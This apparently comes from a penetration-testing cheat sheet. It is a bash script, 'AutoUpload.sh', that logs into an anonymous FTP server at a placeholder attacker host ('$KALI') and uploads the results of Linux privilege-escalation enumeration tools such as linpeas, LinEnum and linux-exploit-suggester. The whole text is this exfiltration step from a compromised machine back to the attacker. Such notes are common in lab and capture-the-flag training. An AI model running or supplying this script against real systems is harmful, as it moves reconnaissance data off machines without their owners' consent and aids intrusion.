#### AutoUpload.sh - ==REMEMBER TO CHANGE $KALI TO IP!==
```bash - kali
#!/bin/sh
HOST='$KALI'
USER='anonymous'
PASSWD='anonymous'


ftp -n $HOST <<END_SCRIPT
quote USER $USER
quote PASS $PASSWD
put LinEnum.txt*
put linpeas.txt
put linux-exploit-suggester.txt
put linuxprivchecker.txt
put suider.sh
put suid3num.txt
quit
END_SCRIPT
exit 0
```
